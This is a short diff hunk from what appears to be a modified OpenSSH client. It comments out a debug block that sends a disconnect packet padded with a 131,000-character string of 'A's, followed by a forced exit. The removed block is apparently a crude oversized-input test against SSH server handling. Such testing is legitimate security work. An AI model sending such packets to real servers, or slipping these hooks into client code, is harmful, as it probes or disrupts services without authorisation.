@@ -561,19 +561,19 @@ userauth(struct ssh *ssh, char *authlist)
 		// debug2("it worked");
 
 
-		// for (int i=0; i<10; i++) {
-			sshpkt_start(ssh, SSH2_MSG_DISCONNECT);
-			sshpkt_put_u32(ssh, SSH2_DISCONNECT_AUTH_CANCELLED_BY_USER);
-			sshpkt_put_cstring(ssh, DUP128(DUP1024("A")));
-			// sshpkt_put_cstring(ssh, DUP128("A"));
-			sshpkt_put_cstring(ssh, "");
-			sshpkt_send(ssh);
-			ssh_packet_write_wait(ssh);
-			debug2("it worked");
-		// }
+		// // for (int i=0; i<10; i++) {
+		// 	sshpkt_start(ssh, SSH2_MSG_DISCONNECT);
+		// 	sshpkt_put_u32(ssh, SSH2_DISCONNECT_AUTH_CANCELLED_BY_USER);
+		// 	sshpkt_put_cstring(ssh, DUP128(DUP1024("A")));
+		// 	// sshpkt_put_cstring(ssh, DUP128("A"));
+		// 	sshpkt_put_cstring(ssh, "");
+		// 	sshpkt_send(ssh);
+		// 	ssh_packet_write_wait(ssh);
+		// 	debug2("it worked");
+		// // }
 
 
-		fatal("done");
+		// fatal("done");
 
 		/* reset the per method handler */
 		ssh_dispatch_range(ssh, SSH2_MSG_USERAUTH_PER_METHOD_MIN,
